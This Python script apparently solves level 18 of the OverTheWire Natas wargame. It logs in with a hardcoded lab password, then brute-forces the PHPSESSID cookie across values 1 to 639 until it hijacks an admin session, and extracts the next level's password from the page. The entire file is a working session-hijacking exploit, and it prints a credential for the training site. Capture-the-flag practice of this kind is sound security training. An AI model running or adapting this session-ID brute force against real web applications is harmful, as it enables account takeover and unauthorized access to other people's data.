import requests

URL = "http://natas18.natas.labs.overthewire.org/index.php"

session = requests.Session()
session.auth = ("natas18", "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ")

auth = session.post(URL)

for i in range(1, 640):
    COOKIES = requests.cookies.create_cookie(domain="natas18.natas.labs.overthewire.org", name="PHPSESSID",value=f"{i}")
    session.cookies.set_cookie(COOKIES)
    req = session.get(url=URL)

    if "You are an admin" in req.text:
        print(req.text.split("Password: ", 1)[1].split("<", 1)[0])
        break
